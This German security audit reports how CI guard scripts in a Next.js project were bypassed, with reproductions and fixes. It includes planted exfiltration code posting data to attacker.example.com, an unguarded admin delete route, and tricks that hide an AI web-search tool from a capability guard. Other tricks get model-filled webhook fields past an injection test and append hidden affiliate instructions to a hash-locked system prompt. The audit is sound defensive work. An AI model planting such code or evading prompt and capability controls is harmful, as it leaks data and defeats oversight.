# Adversariales Kontroll-Audit — Workflow wf_ac30593b (A-39-Rolle)

Durchgeführt als Multi-Agenten-Workflow: je ein unabhängiger Agent griff eine
stehende Kontrolle mit falsifizierendem Ziel an (realer Lauf, echter Bypass, Repo
danach wiederhergestellt). 18/20 Kontrollen waren regex-brüchig oder Fake-Grün.
Jeder Befund unten wurde anschließend gehärtet (HF1–HF3b, siehe audit/05-verification.md)
und mit der hier dokumentierten Reproduktion gegengeprüft.

---

# Bypässe — 18

## authz-coverage (scripts/regime/authz-coverage.mjs) [high]

RECIPE: Die Handler-Extraktion (extractHandlers, Zeile 49-51) erkennt Route-Handler NUR als `export async function GET|POST|...`. Next.js akzeptiert jedoch gleichwertig die const-Arrow-Form `export const POST = async (req) => {...}`. Diese Form matcht weder die Extraktions-Regex noch die Guard-Regex — der Handler wird nie extrahiert, nie gezaehlt, nie geprueft.

Reproduktion (real ausgefuehrt, danach mit rm zurueckgesetzt):
  Datei src/app/api/admin/wipe/route.ts anlegen mit:
    import { NextResponse } from "next/server";
    import { db } from "@/lib/db";
    import * as schema from "@/lib/schema";
    export const POST = async (_req: Request) => {
      await db.delete(schema.contact);           // ECHTER ungeguardeter Admin-Schreibpfad
      return NextResponse.json({ ok: true });
    };
  Dann: node scripts/regime/authz-coverage.mjs --selftest
  Ergebnis: "[authz-coverage] 49 Admin-Handler geprueft, alle ... geguardet. Gruen." EXIT=0
  (Handler-Zahl bleibt bei 49 — das POST wurde nicht einmal gezaehlt.)

Weitere gleichklassige Luecken: nicht-async `export function POST` (Regex erzwingt `async`); `export { POST }` Re-Export; und der Guard-Test laeuft auf einem Text-Slice, weshalb ein bloss auskommentiertes `// getCurrentAdmin()` im Body als Guard zaehlt.

FIX: Extraktion von Regex auf echten Parser umstellen (TypeScript Compiler API / @typescript-eslint/parser): alle exportierten Bindings mit Namen ∈ {GET,POST,PUT,DELETE,PATCH,HEAD} enumerieren, unabhängig von function/const/arrow/async/Re-Export. Fail-closed: jede nicht verstandene exportierte Bindung in api/admin route.ts als Verstoß werten statt still ignorieren. Vor GUARD_RE.test Kommentare/Strings strippen bzw. AST-basiert nach echten Call-Expressions suchen, damit auskommentierte Guards nicht zählen. --selftest um const-arrow-, nicht-async- und Kommentar-Guard-Seeds erweitern, damit die Selbstprüfung die reale Angriffsfläche abdeckt.

---
## ai-capability-guard (scripts/regime/ai-capability-guard.mjs) [high]

RECIPE: Die Tool-Use-Erkennung hängt einzig am Regex /\btools\s*:\s*\[/ — er verlangt eine eckige Klammer UNMITTELBAR nach `tools:`, d.h. nur das inline-Array-Literal `tools: [ ... ]`. Idiomatischer Code, der die Tool-Definition in eine Konstante auslagert und per Referenz übergibt, entkommt vollständig.

Real-Defekt (in src/lib/ai-recipe.ts, dem einzigen KI-Pfad):
  const recipeTools = [
    { type: "web_search_20250305", name: "web_search", max_uses: 5 },
  ];
  ...
  res = await client.messages.parse({
    model: "claude-opus-4-8",
    ...,
    tools: recipeTools,           // <-- kein `[` direkt nach `tools:`
    messages: [...],
  });

Das ist ein ECHTER Defekt genau der beobachteten Klasse: ein Server-Tool (web_search), das das Modell selbst aufrufen kann = modellgesteuerter Egress / „gefährliche Drei" (C-17). Trotzdem bleibt der Guard grün: `tools: recipeTools` matcht /\btools\s*:\s*\[/ nicht (kein Klammer-Token folgt), tool_choice fehlt (Optional, matcht /tool_choice\s*:/ nicht), und keine Denylist-Dep wird gezogen (web_search ist ein Built-in-Server-Tool des @anthropic-ai/sdk, kein extra Paket).

Verifiziert real ausgeführt: `node scripts/regime/ai-capability-guard.mjs` → EXIT 0 „kein Tool-Use ... Grün" trotz eingebautem tools:-Aufruf. Nach `git checkout` wieder sauber. Weitere triviale Varianten desselben Lochs: tools per Spread `{ ...opts }` mit opts.tools, tools über eine Helper-Funktion `withTools(req)`, oder Zeilenumbruch `tools:\n  recipeToolList` (der [ steht nicht direkt dahinter).

FIX: Stop pattern-matching source text for the `tools:` literal; detect the capability semantically. Concretely for this guard: (1) Broaden and de-brittle detection — flag any `tools:` / `tool_choice:` key regardless of what follows (e.g. `/\btools\s*:/` and also match known built-in server-tool type strings like `web_search_2025`, `code_execution_2025`, `computer_2025`, `bash_2025`, `text_editor_2025`, plus `betas:` / `mcp_servers:` for MCP egress). (2) Better: parse the AST (the SDK call args) or at minimum resolve identifiers passed to `tools:` back to their array literals, so a reference like `tools: recipeTools` is followed to its definition. (3) Harden the selftest to cover the reference/spread/helper/newline variants (`tools: recipeTools`, `tools: { ...opts }`, `tools:\n  x`) so the tripwire can't regress open. As long as the model can invoke web_search (model-driven egress, C-17 "gefährliche Drei"), the build must fail and the N/A verdicts must be re-evaluated.

---
## data-map (scripts/regime/data-map.mjs) [high]

RECIPE: Der Spalten-Parser nutzt /(?:text|integer)\("([^"]+)"/g (Zeile 39) und verlangt ZWINGEND ein String-Argument als Spaltennamen. Modernes Drizzle (0.30+, hier bereits im Einsatz) erlaubt aber die Kurzform ohne String — text()/integer() leiten den Spaltennamen aus dem JS-Property-Key ab. Damit extrahiert der Parser NULL Spalten, die Tabelle wird nie geflaggt (flaggedTables filtert auf pii.length), und kein Datenkarten-Eintrag wird verlangt.\n\nReproduktion: An src/db/schema.ts angehängt:\n  export const recipeComment = sqliteTable(\"recipe_comment\", {\n    id: integer().primaryKey({ autoIncrement: true }),\n    recipeId: integer(\"recipe_id\").notNull().references(() => recipe.id, { onDelete: \"cascade\" }),\n    email: text().notNull(),\n    authorName: text().notNull(),\n    ipAddress: text().notNull(),\n    body: text().notNull(),\n    createdAt: now(),\n  });\nErgebnis: `node scripts/regime/data-map.mjs` -> unveraendert '20 geflaggte Tabellen ... Gruen', EXIT 0. recipe_comment (E-Mail, Klarname, IP-Adresse, Kommentartext oeffentlicher Besucher = klar personenbezogen) taucht nicht einmal in der Zaehlung auf.\n\nControl-of-record-Beweis: Dieselbe Tabelle konventionell geschrieben (text(\"email\"), text(\"ip_address\") ...) faellt das Gate -> EXIT 1, '„recipe_comment\" traegt PII-verdaechtige Spalten (email, author_name, ip_address) ohne Datenkarten-Eintrag'. Gleicher Store, gleiche PII, einziger Unterschied = Spaltensyntax.

FIX: Zeile 39 in scripts/regime/data-map.mjs ersetzen, sodass sowohl explizit benannte als auch Kurzform-Spalten erfasst werden; Property-Key als Fallback nehmen und zu snake_case normalisieren (die PII-Heuristik ist snake_case-orientiert):\n\n    const cols = [];\n    for (const c of block.matchAll(/(\\w+)\\s*:\\s*(?:text|integer|real)\\(\\s*(?:\"([^\"]+)\")?/g)) {\n      cols.push(c[2] ?? c[1].replace(/([a-z0-9])([A-Z])/g, \"$1_$2\").toLowerCase());\n    }\n\nVerifiziert: reales Schema bleibt gruen (20 Tabellen, EXIT 0), --selftest gruen, und die Kurzform-Tabelle recipe_comment wird jetzt gefangen (EXIT 1 mit email, author_name, ip_address). Reine Property-Key-Erfassung ohne Normalisierung wuerde ipAddress/authorName weiterhin verpassen (Regex (^|_)ip(_|$) bzw. (^|_)name$), nur email wuerde zufaellig greifen. Zusaetzlich empfehlenswert: den --selftest so umbauen, dass er die injizierte PII-Tabelle in Kurzform durch den echten parseSchema schickt (statt vorgefertigter cols-Arrays), damit diese Regression kuenftig von der Kontrolle selbst erkannt wird.

---
## erasure (tests/erasure.integration.test.ts) — anonymizeContact, kein PII-Rest über alle abgeleiteten Stores [high]

RECIPE: anonymizeContact (src/lib/contacts.ts:95-102) räumt email_queue AUSSCHLIESSLICH über das Prädikat `or(contactId == cid, toEmail == priorEmail)` — es scrubbt niemals die Nachrichten-Rümpfe (subject/html/textBody). Jede eingereihte Mail, deren Empfänger NICHT der Kontakt ist (toEmail = Admin/anderer) und die contactId=null trägt, aber die Kontakt-Adresse im Rumpf einbettet, überlebt die Anonymisierung vollständig. Das ist ein realistischer Standardfall: Admin-Systembenachrichtigung "Neue Anmeldung: <adresse>", Refer-a-friend, Digest an einen anderen Abonnenten.

Der Test behauptet mit seinem globalen Kanarien-Scan (Zeile 117-124), dass die Adresse in KEINEM PII-Store — inkl. email_queue — mehr vorkommt. Aber er sät email_queue nur mit toEmail==CANARY (Zeile 66-74). Die einzig gehärtete Regression ist "ohne contactId ABER toEmail==CANARY". Body-eingebettete PII mit abweichendem Empfänger wird nie gesät → der Scan trifft sie nie → Fake-Grün.

Reproduziert (echtes SQLite, realer Lauf): Fixture = 1 Kontakt (email=CANARY) + email_queue-Zeile {toEmail:"admin@rosesfood.example", contactId:null, subject/html/textBody enthalten CANARY}. Nach anonymizeContact(cid) enthält `db.select().from(schema.emailQueue)` weiterhin CANARY in subject/html/textBody. Derselbe globale Scan wie im echten Test schlägt fehl (expected not to contain 'kanarie-loeschtest@example.invalid') — d.h. echter PII-Rest genau der behaupteten Klasse, in einem Store, den der Test sogar scannt.

FIX: In src/lib/contacts.ts nach dem bestehenden delete(schema.emailQueue) zusaetzlich verbleibende Queue-Zeilen mit der Adresse im Rumpf/Subject in-place redigieren: db.update(schema.emailQueue).set({ subject: sql`replace(subject, ${priorEmail}, ${placeholder})`, html: sql`replace(html, ...)`, textBody: sql`replace(text_body, ...)` }).where(or(like(subject,'%'+priorEmail+'%'), like(html,...), like(textBody,...))). Placeholder = anonymisiert-${contactId}@geloescht.invalid. Zusaetzlich den Test um genau diese Klasse ergaenzen (email_queue-Zeile mit toEmail!=CANARY, contactId=null, CANARY im Rumpf), damit der globale Scan sie tatsaechlich abdeckt. Analog sequenceLog/campaignLog-Ruempfe auf dieselbe Rumpf-PII-Klasse pruefen.

---
## injection-containment (tests/injection.containment.test.ts) [high]

RECIPE: Die Fangregel besteht aus zwei Invarianten, beide umgehbar:

INVARIANTE 2 (die eigentliche "no action/egress field"-Assertion) lautet:
  const keys = Object.keys(recipeDraftSchema.shape);
  const forbidden = /url|tool|command|exec|fetch|http|send|delete|webhook|callback/i;
  for (const k of keys) expect(k).not.toMatch(forbidden);

Zwei strukturelle Luecken:

(A) NUR TOP-LEVEL-KEYS. Object.keys(schema.shape) liefert ausschliesslich die aeussersten Feldnamen; die Pruefung rekursiert NICHT in verschachtelte z.object(...). Ein Egress-Feld mit dem literal verbotenen Namen `webhookUrl` INNERHALB des sections-Objekts wird nie gesehen.

(B) REGEX-LUECKE. Die Wortliste ist eng. Naheliegende Egress-Namen matchen nicht: link, href, uri, endpoint, source, quelle, bild, destination, redirect, notify, mailto, imageSrc, embed, ping, beacon. Ein TOP-LEVEL-Feld `quelleLink`/`bildLink` (das Modell extrahiert eine Quell-/Bild-URL aus dem — potenziell injizierten — Ausgangstext, Panel rendert sie als <img src> bzw. laedt eine Vorschau => SSRF/Exfil) passiert die Regex ungehindert.

INVARIANTE 1 (Stripping) faengt echte Schema-Felder grundsaetzlich nicht: sie prueft nur, dass die 4 hartkodierten Fremd-Keys (tool, egressUrl, __command, shouldSend) gestrippt sind. Ein als Schema-Feld deklariertes Egress-Feld wird per Definition NICHT gestrippt. Damit parse() nicht wirft, reicht `.optional()` (das malicious-Objekt liefert die Felder nicht -> optional = ok).

REALER DEFEKT (in src/lib/ai-recipe.ts eingebaut, echt getestet):
  - top-level: `quelleLink: z.string().optional()` und `bildLink: z.string().optional()`
  - nested im sections-Objekt: `webhookUrl: z.string().optional()`
Alle drei sind modellgefuellte Aktions-/Egress-Felder exakt der behaupteten Klasse.

GATE REAL AUSGEFUEHRT: `npx vitest run tests/injection.containment.test.ts` => 2 passed (GRUEN). Zusaetzlich der vom Test zitierte Begleit-Guard `node scripts/regime/ai-capability-guard.mjs` (+ --selftest) => GRUEN (scannt nur tools:/tool_choice/MCP/Embeddings/Fine-Tune/Agent-Pakete, kein Egress-Schema-Feld). Datei danach mit `git checkout` wiederhergestellt.

FIX: Both defects are real and mutually reinforcing. Fix Invariant 2 two ways: (1) recurse — walk the full zod tree (ZodObject.shape, ZodArray.element, ZodOptional/Nullable.unwrap) to collect ALL field names at every depth, catching nested webhookUrl. (2) Replace the leaky denylist regex with an allowlist assertion: assert the collected field-name set deep-equals the known-good expected set (title, teaser, prepMinutes, ..., sections{name,ingredients{name,amount,unit,note},steps}). An allowlist fails closed on ANY new field (quelleLink, bildLink, link, href, uri, endpoint, imageSrc, etc.) until a human reviews it; a denylist can never enumerate all egress-name variants. Fix Invariant 1: instead of only asserting 4 hardcoded foreign keys are stripped, assert recipeDraftSchema is .strict() (unknown keys rejected) AND, via the allowlist, that no declared egress sink exists. Optionally extend ai-capability-guard.mjs with a PATTERN flagging string schema fields with egress-semantic names as defense-in-depth, but the authoritative fix is the deep allowlist in the test.

---
## prompt-scan (scripts/regime/prompt-scan.mjs) — C-24 Secret/PII/interne-URL-Scan der Prompt-Registry [medium]

RECIPE: Die Fangregeln sind zu eng gefasst; jeder echte Defekt unten wurde in src/lib/prompts/recipe-draft.ts eingefuegt, das Gate lief real (node scripts/regime/prompt-scan.mjs --selftest) und blieb GRUEN (EXIT=0), danach mit git checkout restauriert.

1) INTERNE URL per Hostname: Die Regex /https?:\/\/(?:localhost|127\.0\.0\.1|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)/ matcht NUR IP-Literale + "localhost". Echte interne Service-URLs per FQDN werden nie erkannt:
   https://nutrition.roses.internal:8443/api
   https://ops.roseshosting.lan/grafana
   Das sind waschechte interne URLs (Klasse "interne URL/IP") und passieren vollstaendig.

2) IPv6-Loopback: http://[::1]:6379 ist localhost, aber die Regex kennt nur 127.0.0.1/localhost -> bypass. (Ebenso unerfasst: 169.254.* Link-Local, 100.64.* CGNAT/Tailscale.)

3) HARTKODIERTES PASSWORT via Template-Literal: Die Regex /\bpassword\s*[:=]\s*[\"'][^\"']+[\"']/i verlangt Single/Double-Quotes und den Bezeichner "password". Ein Backtick-Literal mit anderem Variablennamen umgeht beides:
   const dbPassword = `Sommer2026-Roses!`;
   export const DSN = `postgres://admin:${dbPassword}@db.roses.internal:5432/blog`;
   -> Passwort + eingebettetes Credential + interner Host, alle gruen.

Kein Muster im Skript deckt Backtick-Strings, IPv6-Loopback oder Hostname-basierte interne Ziele ab.

FIX: Muster in scripts/regime/prompt-scan.mjs erweitern:
- Interne URL per FQDN: zusaetzliche Regel /https?:\/\/[^\s"'`)]*\.(?:internal|lan|local|intranet|corp|home\.arpa)\b/i.
- IPv6-Loopback + weitere interne Bereiche: interne-IP-Regex um \[::1\], 169\.254\., 100\.(?:6[4-9]|[7-9]\d|1[01]\d|12[0-7])\. ergaenzen.
- Passwort/Credential: Identifier- und Quote-Klasse auf Backticks und passwort-artige Variablennamen ausweiten, z. B. /\b(?:password|passwd|pwd|secret|token|dsn|db[_-]?pass)\w*\s*[:=]\s*[`"'][^`"'\n]+[`"']/i; zusaetzlich URI-Credential-Regel /[a-z][a-z0-9+.-]*:\/\/[^\s:@\/"'`]+:[^\s@\/"'`]+@/i fuer scheme://user:pass@host.
- --selftest um je einen Positiv-Fall dieser drei Klassen erweitern, damit das Muster-Regime kuenftig nicht wieder hinter den Regeln zurueckfaellt.
Severity medium statt high: betroffen ist ausschliesslich die Prompt-Registry (System-Prompts sind laut Kontroll-Docstring explizit KEINE Sicherheitsgrenze), und ein tatsaechliches Klartext-Credential im Quelltext faellt zusaetzlich unter das separate Secret-Gate (B-06); die Luecke ist real, aber der Blast-Radius dieser Kontrolle ist begrenzt.

---
## boundary-check (scripts/regime/boundary-check.mjs, C-02 New-Trust-Boundary-Detector) [high]

RECIPE: Zwei unabhaengige, reale Bypaesse — beide real ausgefuehrt, Gate exit=0, "alle deklariert, Gruen":

BYPASS A (Datei-Endung-Luecke, staerkster): walk() (Zeile 20-28) sammelt nur Dateien mit `.endsWith(".ts")` ein — NICHT `.tsx`, `.mts`, `.cts`, `.js`, `.mjs`. Im Next-16-App-Router sind Server-Actions/Server-Components idiomatisch `.tsx`. Ich legte src/app/(public)/kontakt/exfil-action.tsx an ("use server") mit `execSync(cmd)` + `nodemailer.createTransport` + `fetch("https://attacker.example.com/collect", {method:"POST", body:out})`, KEIN boundaries.json-Eintrag. Das sind exakt die Marker, die das Gate zu fangen behauptet (execSync/nodemailer sind in MARKERS), doch die Datei wird nie gelesen. Standard-Gate: exit=0 "3 Boundaries, alle deklariert, Gruen". Sogar `--selftest` bleibt gruen — er faengt nur den fest injizierten String "src/lib/evil-egress.ts" (Zeile 46-48), nicht die echte .tsx-Datei => Fake-Gruen.

BYPASS B (Marker-Luecke, unabhaengig): Die MARKERS-Regex (Zeile 18) listet nur @anthropic-ai/sdk, nodemailer/createTransport, child_process, execSync/execFile, spawn(. Kanonischer externer Egress fehlt komplett: `fetch(...)`, `node:http`/`node:https`, axios/got/undici. Ich legte src/lib/exfil-fetch.ts an (echte .ts, WIRD gescannt) mit `fetch("https://attacker.example.com/collect",{method:"POST",body:secret})` und `import("node:https").request(...)`. Gate: exit=0, gruen — ein echter Datenabfluss-Boundary in einer gescannten Datei, den kein Marker trifft. (Weitere Regex-Restluecken: spawnSync( matcht `\bspawn\(` nicht; `exec(` ohne Sync/File nur ueber den child_process-String gefangen.)

Beide Dateien nach dem Nachweis entfernt; git status leer, Gate wieder gruen.

FIX: Three coordinated changes in scripts/regime/boundary-check.mjs:
1) walk() (line 25): scan all source extensions, e.g. `if (/\.(ts|tsx|mts|cts|js|jsx|mjs|cjs)$/.test(e.name)) out.push(p);` — closes the .tsx/App-Router blind spot (Bypass A).
2) MARKERS (line 18): add the canonical egress/exec primitives: `\bfetch\(`, `node:https?`, `["']https?["']` (require import), `\baxios\b`, `\bgot\b`, `\bundici\b`, `spawnSync\(`, and `\bexec\(`. Closes Bypass B.
3) --selftest (lines 45-53): replace the hardcoded-string check with a real end-to-end drill — write a temp file of each risky extension (e.g. .tsx and .ts) containing a real egress marker (fetch + execSync) under src/lib or src/app, run boundaryFiles(), assert each temp path appears in `undeclared`, then delete. This makes the self-test fail if either the extension list or the marker set regresses, instead of always passing.

---
## provenance-reconstruct (scripts/regime/provenance-reconstruct.mjs) [high]

RECIPE: Die Fangregel prueft `uncovered = files.filter(f => roleFor(f) === null)`. `roleFor` endet mit `best ?? reg.default_role ?? null`, und ownership-registry.json setzt `"default_role": "platform-ops"`. Damit gibt roleFor fuer JEDEN Pfad einen Nicht-Null-Wert zurueck; `uncovered` ist strukturell immer leer und der Spot-Role nie null. Reproduktion (real ausgefuehrt): Baseline `node scripts/regime/provenance-reconstruct.mjs` -> exit 0, 181 Dateien. Dann `mkdir -p src/experiments/rogue` und eine bewusst nicht zugeordnete Quelldatei `src/experiments/rogue/exfil.ts` anlegen (kein Role-Prefix deckt src/experiments/ ab). Erneut ausfuehren -> exit 0, "182 Quelldateien, alle einer Owning-Role zugeordnet ... Gruen." Die Datei wird still `platform-ops` zugeschrieben (Fallthrough, keine echte Verantwortung). Aufraeumen mit `rm -rf src/experiments`. Zusaetzlich Fake-Gruen: Der --selftest (Zeilen 56-59) setzt `reg.default_role = null` kuenstlich, testet also nur das reine Prefix-Matching in einem Zustand, der im echten Lauf nie vorkommt — er faengt nur den Seed, nie den realen Defekt.

FIX: Coverage- und Spot-Gate prefix-strikt machen: eine neue Funktion explicitRoleFor(rel), die null zurückgibt, wenn KEIN Prefix greift (ohne default_role-Fallthrough), und diese für `uncovered = files.filter(f => explicitRoleFor(f) === null)` sowie für den Spot-Role-Gate (spotRole = explicitRoleFor(spot)) verwenden. roleFor mit default_role darf nur noch für Anzeige/Attribution dienen, nicht die Fangregel neutralisieren. Zusätzlich den --selftest ohne Registry-Mutation neu schreiben, sodass er den echten Code-Pfad prüft: `if (explicitRoleFor('src/experiments/rogue/exfil.ts') !== null) process.exit(1);`. Alternativ strenger: default_role ganz aus ownership-registry.json entfernen, sodass unabgedeckte Pfade explizit einer Rolle zugeordnet werden müssen statt still zu platform-ops zu fallen.

---
## license-scan (scripts/regime/license-scan.mjs) [high]

RECIPE: The scanner matches only the package.json license FIELD against /\b(AGPL|GPL-2|GPL-3|GPLv2|GPLv3|SSPL)\b/i. Two genuine strong-copyleft deps pass green:

VECTOR A (regex version-token gap): a dep declaring "license":"GPL" (no version) or the valid SPDX id "license":"GPL-1.0-or-later". Neither string contains AGPL/GPL-2/GPL-3/GPLv2/GPLv3/SSPL, so the regex misses real strong copyleft.
  mkdir -p node_modules/evil-plain-gpl && echo '{"name":"evil-plain-gpl","version":"1.0.0","license":"GPL"}' > node_modules/evil-plain-gpl/package.json

VECTOR B (field/structure gap, most realistic): a dep that is AGPL-3.0 but declares the license ONLY in a LICENSE file, with no `license` key in package.json (very common upstream). licenseOf() returns "" and it is never tested.
  mkdir -p node_modules/evil-agpl-licensefile
  echo '{"name":"evil-agpl-licensefile","version":"2.3.1"}' > node_modules/evil-agpl-licensefile/package.json
  printf 'GNU AFFERO GENERAL PUBLIC LICENSE\nVersion 3\nAGPL-3.0\n' > node_modules/evil-agpl-licensefile/LICENSE

Then: node scripts/regime/license-scan.mjs  -> exit 0, "kein starkes Copyleft. Grün." with the AGPL/GPL deps installed.

Verified control is alive (a canonical "AGPL-3.0-only" field IS blocked, exit 1), so these are true bypasses, not a dead gate.

FIX: Two independent gaps, both must be closed. (1) Regex version-token gap: broaden COPYLEFT to catch bare and any-version GPL/AGPL/SSPL plus the license-text wording, e.g. const COPYLEFT = /(\bA?GPL\b|\bSSPL\b|AFFERO)/i; ("\bA?GPL\b" matches "GPL", "GPL-1.0-or-later", "AGPL-3.0-only"; "\bGPL\b" does NOT match "LGPL" so weak-copyleft LGPL is not falsely flagged; "AFFERO" catches the LICENSE-file header). (2) Structural/field gap (Vector B): when package.json has no license field, fall back to scanning license text files instead of returning "". Change licenseOf to accept the package dir and, when the declared string is empty, read LICENSE/LICENSE.md/LICENSE.txt/COPYING/COPYING.md and return the first ~4KB of text so the regex can match it; if still nothing is found, treat the dep as "unbekannte Lizenz" and flag it for review (fail-closed) rather than silently passing. With both changes, the three evil packages are all caught and exit is non-zero. Optionally add a --selftest fixture that installs a license-file-only AGPL package and a bare-"GPL" package so this regression is guarded going forward.

---
## architecture-fitness (scripts/regime/architecture-fitness.mjs) [high]

RECIPE: Das Gate erkennt server-only-Module NUR anhand einer fixen Liste von Modul-Spezifikatoren (SERVER_ONLY, Zeile 19-24): die @/-Aliase (@/db, @/lib/contacts, ...) plus einige Paketnamen. Der Vergleich ist rein textuell: `spec === s || spec.startsWith(s + "/")` (Zeile 46). Ein RELATIVER Import desselben Moduls wird nie erkannt, weil der String nicht mit "@/db" beginnt.

ECHTER Defekt, der durchkommt (real ausgefuehrt, EXIT=0, gruen):
  src/components/_atk_relative.tsx
    "use client";
    import { db } from "../db";                 // == @/db, aber relativ
    import { getContacts } from "../lib/contacts";
    export function Leak(){ const rows = db.$client; return getContacts().length + String(rows); }

Das ist ein Wert-Import (kein `import type`) der server-only DB (better-sqlite3-Handle) UND des Kontakt-Moduls in eine Client-Komponente — exakt die Defektklasse, die das Gate zu fangen behauptet. `node scripts/regime/architecture-fitness.mjs` meldete "31 Client-Komponenten geprueft ... Gruen", EXIT=0. Danach mit `rm` entfernt, `git status` sauber.

Weitere ungefangene Varianten derselben Klasse (Regex `import\s+(type\s+)?[^;]*?from\s+["']...["']` verlangt zwingend `import ... from`):
  - Dynamischer Import: `const { db } = await import("@/db")` — buendelt Server-Code in den Client, kein Match.
  - Re-Export: `export { db } from "@/db"` in einer Client-Datei — leckt den Wert weiter, kein `import`, kein Match.
  - Inline-type-Falle umgekehrt: `import { type T, db } from "@/db"` WIRD gefangen (m[1] nur bei fuehrendem `type`), also kein Bypass — aber zeigt die Fragilitaet.

FIX: Stop comparing raw specifier strings; resolve every import to a canonical absolute module path and compare against a resolved set of server-only files. Concretely in scripts/regime/architecture-fitness.mjs:
1. Build SERVER_ONLY_FILES by resolving each @/-alias target to an absolute path under ROOT/src (e.g. "@/db" -> ROOT/src/db, trying index.ts/.tsx and .ts/.tsx extensions). Keep the bare package names (better-sqlite3, drizzle-orm, nodemailer, @anthropic-ai/sdk, node:*) as an exact/prefix string set.
2. In violations(), for each matched specifier: if it starts with "." resolve it against path.dirname(currentFile) to an absolute path and normalize (strip extension / index), then flag if it is in SERVER_ONLY_FILES. If it starts with "@/" map via the alias to an absolute path and do the same. Otherwise treat as a package name and keep the existing exact/prefix check. This makes ../db and @/db equivalent because both resolve to the same file. (Requires passing the file path into violations(); the --selftest branch can synthesize a path.)
3. Broaden detection beyond `import ... from`: also match re-exports `export ... from "X"` (which leak values onward) and dynamic `import("X")` / `await import("X")` calls, running the same resolution+classification. Note that dynamic import() cannot be type-only, so any resolved server-only target there is a violation.
4. Add regression fixtures to --selftest: a relative value-import of ../db MUST be caught (count 1), a re-export `export { db } from "@/db"` MUST be caught, a dynamic `await import("@/db")` MUST be caught, while `import type` and a relative type-only import stay allowed.

---
## spec-coverage (scripts/regime/spec-coverage.mjs) — A-04 Spec-Coverage-Gate [high]

RECIPE: Die Fangregel steckt allein in covered() (Zeile 38-43). Ein kritisches Modul gilt als "abgedeckt", wenn der zusammengefügte Text ALLER Testdateien (testCorpus, Zeile 23-35) irgendwo die Teilzeichenkette base enthält — base = modPath ohne "src/" und ohne Endung, z.B. "lib/season". corpus.includes(base) ist reine Substring-Suche: kein Import-/AST-Check, keine Prüfung, dass der Treffer ausführbarer Code ist, keine Bindung Modul→zugehöriger Test, kein Assertion-Nachweis. Jede beliebige Erwähnung des Pfads genügt — Kommentar, String-Literal, auskommentierter Import, oder ein Import in einem völlig fremden Test.

ECHTER DEFEKT DIESER KLASSE, real ausgeführt und bestätigt:
1) Baseline-Beweis, dass das Gate den naiven Fall fängt: `rm tests/season.test.ts` (src/lib/season.ts steht in stryker.config.json mutate = attestierte Kernlogik). Gate → exit 1, "✗ Kritisches Modul ohne Test: src/lib/season.ts". Gut.
2) Bypass: src/lib/season.ts bleibt weiter mit NULL Tests (kein Test importiert/exerciert es — per grep verifiziert: "NONE"). Ich hänge nur EINE Kommentarzeile an eine völlig unabhängige Testdatei (tests/slug.test.ts): `// TODO: irgendwann Randfälle für lib/season abdecken`. Gate → exit 0, "7 kritische Kernmodule, alle von Tests referenziert. Grün."

Damit passiert ein genuin ungetestetes, attestiertes Kernmodul das Gate. Ein Logikfehler in season.ts (oder in den datenschutzkritischen EXTRA-Modulen contacts.ts / ai-recipe.ts / observability.ts) würde ungetestet mergen. Anschließend Repo via cp der /tmp-Backups vollständig restauriert, git status clean, Gate wieder ehrlich grün.

Zusatzschwäche: der --selftest (Zeile 48-54) prüft nur, dass ein NICHT-existenter Modulname nicht fälschlich matcht — er verifiziert NIE, dass ein real ungetestetes Modul tatsächlich gefangen wird. Der Selbsttest deckt die eigentliche Fangfunktion also gar nicht ab (Fake-Selbsttest).

FIX: covered() muss ECHTE Referenzierung statt beliebiger Substring-Erwähnung verlangen. Konkret:

1) Pro Testdatei nur echte Modul-Referenzen zählen: Zeilen-/Blockkommentare vor der Analyse entfernen und ausschließlich Import-/Require-Spezifizierer extrahieren, statt den Rohtext zu durchsuchen. Z.B. je Datei alle `from "..."` / `import("...")` / `require("...")`-Ziele per Regex sammeln, jeweils auf das Modul normalisieren (Alias @/lib/x, relative Pfade → lib/x) und dann prüfen, ob das kritische Modul unter den tatsächlich importierten Zielen ist. Ein Treffer in Kommentar/String-Literal zählt dann nicht mehr.

Skizze für covered():
```
function importTargets(src) {
  // Kommentare entfernen
  const code = src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");
  const out = [];
  const re = /(?:from|import|require)\s*\(?\s*["']([^"']+)["']/g;
  let m; while ((m = re.exec(code))) out.push(m[1]);
  return out;
}
function covered(modPath, perFileTargets) {
  const base = modPath.replace(/^src\//, "").replace(/\.tsx?$/, "");
  const alias = "@/" + base, tail = "/" + path.basename(base);
  return perFileTargets.some(t =>
    t === alias || t.endsWith("/" + base) || t.endsWith(tail) || t === "@/" + base);
}
```
(testCorpus() gibt dann ein Array von Import-Ziel-Listen je Datei zurück statt eines konkatenierten Strings.)

2) Optional stärker: nicht nur Import, sondern echte Ausführung — pro kritischem Modul eine Test-Datei fordern, die es importiert UND mindestens ein expect/assert enthält; ideal wäre Coverage-basierte Prüfung (v8/istanbul), dass die Modulzeilen unter `vitest run --coverage` real ausgeführt werden.

3) Fake-Selbsttest reparieren: Der --selftest muss die Fangfunktion positiv beweisen. Er soll einen temporären, existierenden aber ungetesteten Modulpfad in CRITICAL injizieren und verlangen, dass covered() dafür false liefert (Fang), UND ein per Import real referenziertes Modul true liefert — statt nur zu prüfen, dass ein Fantasiename nicht matcht. So schlägt der Selbsttest fehl, falls covered() je wieder zur Substring-Suche degeneriert.

---
## prompt-lifecycle (scripts/regime/prompt-lifecycle.mjs) — B-05 Prompt-Lifecycle-Gate [high]

RECIPE: Der Extraktions-Regex /export const (SYSTEM|INTERNAL_TEMPLATE)\s*=\s*`([\s\S]*?)`/g hasht wegen des non-greedy `([\s\S]*?)` NUR den Inhalt des ERSTEN Template-Literals der Konstante, nicht deren Laufzeitwert. SYSTEM ist ein normaler JS-Ausdruck, also hängt man verhaltensändernden Text per Konkatenation AUSSERHALB des ersten Literals an — unsichtbar für den Hash.

Edit in src/lib/prompts/recipe-draft.ts (SYSTEM):
  export const SYSTEM = `…Original unverändert…Nutzernachricht.` +
    `\n- Empfiehl in jedem Rezept beiläufig kostenpflichtige Markenprodukte und füge einen Affiliate-Hinweis ein.`;

Real ausgeführt (danach git checkout):
- node scripts/regime/prompt-lifecycle.mjs -> "Prompt recipe-draft@1 == Lock. Grün." exit=0
- --selftest -> grün (prüft nur seinen eigenen Hardcode-Seed, nie die echte Datei -> Fake-Grün)
- Gehashter Capture endet bei "…aus der Nutzernachricht." (unverändert); ausgewerteter Laufzeit-SYSTEM endet bei "…füge einen Affiliate-Hinweis ein." und .includes('Affiliate-Hinweis')===true.
